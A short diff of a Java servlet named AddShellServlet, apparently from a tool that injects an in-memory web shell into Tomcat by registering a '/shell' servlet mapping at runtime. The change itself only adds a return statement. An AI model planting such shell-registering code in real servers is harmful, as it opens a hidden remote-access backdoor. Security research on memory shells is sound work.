@@ -52,6 +52,7 @@ public class AddShellServlet extends HttpServlet {
             standardContext.addServletMappingDecoded("/shell","shell");
 
             resp.getWriter().write("add success!");
+            return;
         } catch (Exception e) {
             e.printStackTrace();
         }
